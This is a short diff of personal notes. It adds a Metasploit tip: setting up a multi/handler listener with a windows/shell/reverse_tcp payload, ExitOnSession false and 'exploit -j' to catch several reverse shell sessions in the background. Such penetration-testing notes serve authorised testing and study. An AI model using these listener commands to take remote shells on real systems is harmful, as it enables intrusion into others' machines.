@@ -1,2 +1,15 @@
 ip -4 addr show scope global    /*Determine interfaces ip address + prefix*/
 ip route show | grep default    /*Determine which interface is public*/
+-----------------------------------------------------------------------------------------------------
+In order to get multiple session on a single multi/handler, 
+you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. 
+For example, for shell/reverse_tcp payload,
+
+msf>use exploit multi/handler
+msf>set payload windows/shell/reverse_tcp
+msf>set lhost <local IP>
+msf>set lport <local port>
+msf> set ExitOnSession false
+msf>exploit -j
+
+The -j option is to keep all the connected session in the background.
